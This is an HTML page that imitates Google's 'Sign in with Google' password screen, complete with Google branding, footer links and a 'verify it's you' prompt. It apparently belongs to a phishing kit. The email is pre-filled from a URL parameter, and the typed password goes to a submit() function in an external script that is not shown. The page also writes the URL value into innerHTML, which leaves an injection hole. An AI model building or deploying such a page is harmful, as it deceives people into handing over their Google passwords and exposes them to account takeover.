<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>Sign In - Google Accounts</title>
  <link href="style.css" rel="stylesheet" type="text/css" />
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
  <link rel="icon" href="glogo.png">
</head>

<body>
  <div class="parent-container">
    <div class="container">
      <div class="topBar">
        <img src="glogo.png"> Sign in with Google
      </div>
      <hr>
      <div class="main">
        <br><br><br>
        <div class="left">
          <br><br>
          <h1>Welcome</h1>
          <h4><span id="email"></span></h4>
        </div>
        <div class="right">
          <p>To continue, first verify it's you</p>
          <div class="input-container">
            <input type="text" id="password" required>
            <label for="password">Enter your password</label>
          </div>
          <br><br><br>
          <button onclick="" class="create-btn">Forgot Password?</button>
          <button onclick="submit()" class="next-btn">Next</button>
        </div>
      </div>
    </div>
    <div class="bottom-container">
      <p>English (United States)</p>
      <a href="https://support.google.com" target="_blank" class="hoverrr">Help</a>
      <a href="https://policies.google.com/privacy" target="_blank" class="hoverrr">Privacy</a>
      <a href="https://policies.google.com/terms" target="_blank" class="hoverrr">Terms</a>
    </div>
  </div>
  <script src="script.js"></script>
  <script>
    document.getElementById("email").innerHTML = getQueryParams().email || "";
  </script>
</body>

</html>
